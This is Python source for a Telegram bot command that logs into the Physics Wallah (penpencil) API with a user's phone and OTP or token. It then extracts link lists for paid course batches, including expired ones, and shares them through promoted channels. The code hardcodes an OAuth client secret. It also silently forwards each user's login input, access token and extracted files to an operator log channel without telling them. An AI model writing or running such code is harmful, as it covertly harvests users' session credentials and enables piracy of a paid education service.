@app.on_message(filters.command(["pw"]))
async def pw_login(app, message):
    try:
        query_msg = await app.ask(
            chat_id=message.chat.id,
            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:**\n---\n**DONT LOGIN WITH PHONE NUMBER, It Leads to ban your account of PW**")
        await forward_to_log(query_msg, "PW Extractor")

        user_input = query_msg.text.strip()

        if user_input.isdigit():
            mob = user_input
            payload = {
                "username": mob,
                "countryCode": "+91",
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            headers = {
                "client-id": "5eb393ee95fab7468a79d189",
                "client-version": "12.84",
                "Client-Type": "MOBILE",
                "randomId": "e4307177362e86f1",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }

            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
            otp_response = requests.post(
                "https://api.penpencil.co/v1/users/get-otp?smsType=0",
                headers=headers,
                json=payload
            ).json()

            if not otp_response.get("success"):
                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
                return

            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
            otp = otp_msg.text.strip()

            token_payload = {
                "username": mob,
                "otp": otp,
                "client_id": "system-admin",
                "client_secret": "KjPXuAVfC5xbmgreETNMaL7z",
                "grant_type": "password",
                "organizationId": "5eb393ee95fab7468a79d189",
                "latitude": 0,
                "longitude": 0
            }

            await app.send_message(message.chat.id, "🔄 **Verifying OTP... Please wait!**")
            token_response = requests.post(
                "https://api.penpencil.co/v3/oauth/token",
                data=token_payload
            ).json()

            token = token_response.get("data", {}).get("access_token")
            if not token:
                await message.reply_text("❌ **Login failed! Invalid OTP.**")
                return

            dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await app.send_message(PREMIUM_LOGS, dl)

        elif user_input.startswith("e"):
            token = user_input
        else:
            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
            return

        headers = {
            "client-id": "5eb393ee95fab7468a79d189",
            "client-type": "WEB",
            "Authorization": f"Bearer {token}",
            "client-version": "3.3.0",
            "randomId": "04b54cdb-bf9e-48ef-974d-620e21bd3e23",
            "Accept": "application/json, text/plain, */*"
        }

        # ========== 🔥 MODIFIED: Expired Batches Fetch ==========
        all_batches = []
        for mode in [0, 1, 2]:
            try:
                batch_response = requests.get(
                    f"https://api.penpencil.co/v3/batches/my-batches?mode={mode}&amount=paid&page=1",
                    headers=headers
                ).json()
                batches = batch_response.get("data", [])
                if batches:
                    all_batches.extend(batches)
            except:
                continue

        seen = set()
        unique_batches = []
        for batch in all_batches:
            batch_id = batch.get("_id")
            if batch_id and batch_id not in seen:
                seen.add(batch_id)
                unique_batches.append(batch)
        batches = unique_batches
        # ========== MODIFIED CODE END ==========

        if not batches:
            await message.reply_text("❌ **No batches found for this account (including expired ones).**")
            return

        batch_text = "📚 **Your Batches (Including Expired):**\n\n"
        batch_map = {}
        batch_status = {}

        for batch in batches:
            bi = batch.get("_id")
            bn = batch.get("name")
            status = batch.get("status", "Unknown")
            batch_status[bi] = status
            status_emoji = "🟢" if status == "active" else "🔴" if status == "expired" else "🟡"
            batch_text += f"{status_emoji} `{bi}` → **{bn}** _{status}_\n"
            batch_map[bi] = bn

        query_msg = await app.send_message(
            chat_id=message.chat.id,
            text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**\n⚠️ Note: Expired batches may not have accessible content.",
            reply_markup=None
        )

        target_id_msg = await app.ask(message.chat.id, text="🆔 **Enter the Course ID here:**")
        target_id = target_id_msg.text.strip()

        if target_id not in batch_map:
            await message.reply_text("❌ **Invalid Course ID! Please try again.**")
            return

        # ========== NEW: Check if batch is expired ==========
        if batch_status.get(target_id) in ["expired", "completed"]:
            confirm = await app.ask(
                message.chat.id,
                text=f"⚠️ **Warning:** This batch is **{batch_status.get(target_id)}**. Contents may not be accessible. Do you want to continue?\n\nReply with `yes` to continue or `no` to cancel."
            )
            if confirm.text.strip().lower() != "yes":
                await message.reply_text("❌ **Extraction cancelled.**")
                return

        # TERA ORIGINAL 1 AUR 2 WALA OPTION
        option_msg = await app.ask(
            message.chat.id,
            text="**Kya extract karna hai?**\n\n`1` - Full Batch\n`2` - Today Class Only"
        )
        option = option_msg.text.strip()

        today_only = False
        mode_text = "Full Batch"

        if option == "1":
            mode_text = "Full Batch"
        elif option == "2":
            today_only = True
            mode_text = "Today Class"
        else:
            await message.reply_text("❌ **Galat input**\n\n`1` - Full Batch\n`2` - Today Class")
            return

        batch_name = batch_map[target_id]
        filename = f"{batch_name.replace('/', '_').replace(':', '_').replace('|', '_')}_{mode_text.replace(' ', '_')}.txt"

        await app.send_message(
            chat_id=message.chat.id,
            text=f"🕵️ **Fetching {mode_text} for:** **{batch_name}**... Please wait!"
        )

        course_response = requests.get(
            f"https://api.penpencil.co/v3/batches/{target_id}/details",
            headers=headers
        ).json()

        subjects = course_response.get("data", {}).get("subjects", [])
        if not subjects:
            await message.reply_text("❌ **No subjects found for the selected course.**")
            return

        progress_msg = await app.send_message(
            chat_id=message.chat.id,
            text=f"🚀 **Initializing {mode_text} Extraction...**"
        )

        all_subjects_progress = {}
        total_links = [0]
        all_links = []

        async def update_progress():
            progress_text = f"📊 **{mode_text} Extraction Progress**\n\n"
            for subject, status in all_subjects_progress.items():
                icon = "✅" if status else "⏳"
                progress_text += f"{icon} **{subject}**\n"
            progress_text += f"\n📝 Total Links: {total_links[0]}"
            try:
                await progress_msg.edit_text(progress_text)
            except:
                pass

        start_time = time.time()

        async with aiohttp.ClientSession() as session:
            tasks = []
            for subject in subjects:
                si = subject.get("_id")
                sn = clean_text(subject.get("subject", ""))
                all_subjects_progress[sn] = False
                await update_progress()

                task = process_subject_content(session, target_id, si, headers, all_links, total_links, today_only)
                tasks.append(task)

            await asyncio.gather(*tasks)

            for sn in all_subjects_progress:
                all_subjects_progress[sn] = True
            await update_progress()

        if not all_links:
            await message.reply_text(f"❌ **{mode_text} me koi class nahi mili.**")
            return

        with open(filename, 'w', encoding='utf-8') as f:
            for line in all_links:
                f.write(line + "\n")

            f.write("\n━━━━━━━━━━━━━━━━━━━━━\n")
            f.write("💓 Join Us: @ZXBOT1\n")
            f.write("━━━━━━━━━━━━━━━━━━━━━")

        end_time = time.time()
        extraction_time = end_time - start_time

        up = (f"**Login Succesfull for PW:** `{token}`")
        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}\n Mode: {mode_text}")
        caption = (
    "━━━━━━━━━━━━━━━━━━━\n"
    "🏦 𝐏𝐡𝐲𝐬𝐢𝐜𝐬 𝐖𝐚𝐥𝐥𝐚𝐡 (PW)\n"
    "━━━━━━━━━━━━━━━━━━━\n\n"
    f"🎯 𝐁𝐚𝐭𝐜𝐡 𝐈𝐃 ➜ {target_id}\n"
    f"📚 𝐁𝐚𝐭𝐜𝐡 𝐍𝐚𝐦𝐞 ➜ {batch_name}\n"
    f"📑 𝐌𝐨𝐝𝐞 ➜ {mode_text}\n\n"
    f"⚡ 𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐢𝐨𝐧 𝐓𝐢𝐦𝐞 ➜ {extraction_time:.2f}s\n"
    f"📅 𝐃𝐚𝐭𝐞 ➜ {time_new}\n\n"
    "━━━━━━━━━━━━━━━━━━━\n"
    "🌐 Join Us ➜ [JOIN BACKUP](https://t.me/ZXBOT1)\n"
    "━━━━━━━━━━━━━━━━━━━"
        )
        await app.send_document(chat_id=message.chat.id, document=filename, caption=caption)
        await app.send_document(PREMIUM_LOGS, document=filename, caption=captionn)
        await app.send_message(PREMIUM_LOGS, up)

    except Exception as e:
        error_msg = str(e)
        error_msg = clean_text(error_msg[:200]) + "..." if len(error_msg) > 200 else clean_text(error_msg)
        await message.reply_text(f"❌ **An error occurred:** `{error_msg}`")
